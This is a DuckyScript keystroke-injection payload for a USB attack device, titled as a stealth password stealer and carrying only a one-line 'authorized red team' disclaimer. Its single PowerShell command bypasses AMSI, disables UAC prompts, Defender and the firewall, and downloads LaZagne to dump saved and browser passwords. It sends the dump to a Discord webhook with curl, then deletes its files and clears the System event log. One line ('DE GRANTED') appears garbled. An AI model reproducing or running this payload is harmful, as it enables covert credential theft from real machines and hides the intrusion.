REM Title: Stealth Password Stealer with AMSI Bypass
REM Description: Bypasses AMSI, steals passwords with LaZagne, disables security, and exfiltrates to a Discord webhook
REM Author: Spade
REM Note: For authorized red team use only

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$bypass = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }; Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name ConsentPromptBehaviorAdmin -Value 0; Set-MpPreference -DisableRealtimeMonitoring $true; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force; Add-MpPreference -ExclusionPath 'C:'; $Test = $env:TEMP; $fname = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}); Start-BitsTransfer https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -Destination \"$Test\$fname.exe\"; while (!(Test-Path \"$Test\$fname.exe\")) { Start-Sleep -Seconds 1 }; cd $Test; .\\$fname.exe all -vv > \"$env:computername.txt\"; .\\$fname.exe browsers -vv >> \"$env:computername.txt\"; curl.exe [DISCORD WEBHOOK URL] -F \"file1=@$Test\$env:computername.txt\"; Remove-Item \"$Test\$fname.exe\", \"$Test\$env:computername.txt\" -Force; wevtutil cl System"
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 500
ENTER
DE GRANTED
DELAY 1000
STRING exit
ENTER
